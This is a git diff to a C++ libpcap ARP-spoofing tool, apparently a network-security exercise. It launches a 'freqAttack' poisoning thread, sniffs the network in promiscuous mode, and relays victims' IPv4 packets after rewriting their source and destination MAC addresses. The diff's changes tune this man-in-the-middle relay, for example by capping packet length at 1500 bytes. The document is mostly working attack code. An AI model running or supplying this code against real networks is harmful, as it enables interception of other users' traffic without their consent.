@@ -174,14 +174,13 @@ int main (int argc, char* argv[]) {
 	pthread_t p;
 	pthread_create(&p, nullptr, freqAttack, (void*)&s);
 
-	sleep(2);
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		exit(1);
 	}
-	printf("Arp Spoofing starts..\n");
+	printf("Arp Spoofing starts\n");
 	
 	struct pcap_pkthdr* header;
 	const u_char* pkt;
@@ -201,8 +200,10 @@ int main (int argc, char* argv[]) {
 		} else if (ptr->eth_.type_ == htons(EthHdr::Ip4)) {
 			for (int i = 0; i < s; i++) {
 				if ( (memcmp( &(ptr->eth_.smac_), &(senderMac[i]), sizeof(Mac) ) == 0)) {
-					memcpy(&(ptr->eth_.smac_), &myMac, sizeof(Mac)); 
-					if ( pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pkt), header->len ) < 0 ) {
+					memcpy(&(ptr->eth_.smac_), &myMac, sizeof(Mac));
+					memcpy(&(ptr->eth_.dmac_), &(receiverMac[i]), sizeof(Mac));
+				  	
+					if ( pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pkt), ((header->caplen) < 1500 ? header->caplen : 1500) ) < 0 ) {
 						fprintf(stderr, "pcap_sendpacket error (%s)\n", pcap_geterr(handle));
 						exit(1);
 					}
